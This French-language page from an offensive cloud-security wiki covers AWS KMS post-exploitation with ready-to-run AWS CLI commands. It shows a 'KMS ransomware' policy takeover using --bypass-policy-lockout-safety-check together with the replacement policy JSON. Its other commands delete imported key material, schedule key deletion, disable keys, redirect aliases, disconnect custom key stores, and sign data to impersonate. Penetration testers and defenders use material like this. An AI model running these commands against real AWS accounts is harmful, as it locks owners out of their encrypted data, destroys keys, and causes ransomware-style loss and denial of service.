# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Pour plus d'informations, consultez :

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt information

`fileb://` and `file://` sont des schémas URI utilisés dans les commandes AWS CLI pour spécifier le chemin vers des fichiers locaux :

- `fileb://:` Lit le fichier en mode binaire, couramment utilisé pour des fichiers non texte.
- `file://:` Lit le fichier en mode texte, généralement utilisé pour des fichiers en texte brut, des scripts, ou du JSON qui n'a pas d'exigences d'encodage particulières.

> [!TIP]
> Notez que si vous souhaitez déchiffrer des données contenues dans un fichier, le fichier doit contenir les données binaires, et non des données encodées en base64. (fileb://)

- Utilisation d'une clé **symétrique**
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Utiliser une clé **asymétrique**:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Un attaquant disposant d'un accès privilégié à KMS pourrait modifier la KMS policy des keys et **accorder à son compte l'accès à celles-ci**, supprimant l'accès accordé au compte légitime.

Les utilisateurs du compte légitime ne pourront alors plus accéder à aucune information d'aucun service chiffré avec ces keys, créant un ransomware simple mais efficace contre le compte.

> [!WARNING]
> Notez que **AWS managed keys aren't affected** par cette attaque, seules **Customer managed keys** le sont.

> Notez aussi la nécessité d'utiliser le paramètre **`--bypass-policy-lockout-safety-check`** (l'absence de cette option dans la web console rend cette attaque possible uniquement depuis la CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Notez que si vous modifiez cette policy et ne donnez l'accès qu'à un compte externe, et que depuis ce compte externe vous essayez ensuite de définir une nouvelle policy pour **rendre l'accès au compte d'origine, vous ne pourrez pas le faire car l'action Put Polocy ne peut pas être exécutée depuis un compte croisé**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### KMS Ransomware générique

Il existe une autre façon d'exécuter un KMS Ransomware global, qui impliquerait les étapes suivantes :

- Créer une nouvelle **clé avec un key material** importé par l'attaquant
- **Ré-encrypter les anciennes données** de la victime chiffrées avec la version précédente en utilisant la nouvelle
- **Supprimer la clé KMS**
- Désormais seul l'attaquant, qui possède le key material original, pourrait être capable de déchiffrer les données chiffrées

### Supprimer des clés via kms:DeleteImportedKeyMaterial

Avec la permission `kms:DeleteImportedKeyMaterial`, un acteur peut supprimer le key material importé des CMKs ayant `Origin=EXTERNAL` (CMKs qui ont importé leur key material), les rendant incapables de déchiffrer les données. Cette action est destructive et irréversible à moins qu'un key material compatible ne soit ré-importé, permettant à un attaquant de provoquer effectivement une perte de données de type ransomware en rendant l'information chiffrée définitivement inaccessible.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Détruire des clés

La destruction des clés permet d'effectuer un DoS.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Notez que AWS **empêche désormais que les actions précédentes soient effectuées depuis un cross account :**

### Modifier ou supprimer Alias
Cette attaque supprime ou redirige les aliases AWS KMS, interrompant la résolution des clés et provoquant des échecs immédiats dans tous les services qui s'appuient sur ces aliases, entraînant un déni de service. Avec des autorisations telles que `kms:DeleteAlias` ou `kms:UpdateAlias`, un attaquant peut supprimer ou rediriger des aliases et perturber les opérations cryptographiques (par ex., encrypt, describe). Tout service qui référence l'alias au lieu de l'ID de clé peut échouer jusqu'à ce que l'alias soit restauré ou correctement remappé.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Cancel Key Deletion
Avec des permissions telles que `kms:CancelKeyDeletion` et `kms:EnableKey`, un acteur peut annuler la suppression programmée d'une customer master key AWS KMS et la réactiver ultérieurement. Cela permet de récupérer la clé (initialement en état Disabled) et de restaurer sa capacité à déchiffrer des données précédemment protégées, permettant l'exfiltration.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Désactiver la clé
Avec la permission `kms:DisableKey`, un acteur peut désactiver une Customer Master Key AWS KMS, l'empêchant d'être utilisée pour le chiffrement ou le déchiffrement. Cela coupe l'accès pour tous les services qui dépendent de cette CMK et peut provoquer des perturbations immédiates ou un déni de service jusqu'à ce que la clé soit réactivée.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Derive Shared Secret
Avec la permission `kms:DeriveSharedSecret`, un acteur peut utiliser une clé privée détenue par KMS ainsi qu'une clé publique fournie par l'utilisateur pour calculer un secret partagé ECDH.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
Avec la permission `kms:Sign`, un acteur peut utiliser un CMK stocké dans KMS pour signer cryptographiquement des données sans exposer la private key, produisant des signatures valides qui peuvent permettre l'impersonation ou autoriser des actions malveillantes.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
Avec des permissions comme `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore` ou `kms:UpdateCustomKeyStore`, un acteur peut modifier, déconnecter ou supprimer un AWS KMS Custom Key Store (CKS), rendant ses clés maîtresses inopérantes. Cela perturbe les opérations de chiffrement, de déchiffrement et de signature pour tous les services qui dépendent de ces clés et peut provoquer un denial-of-service immédiat. Il est donc crucial de restreindre et de surveiller ces autorisations.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
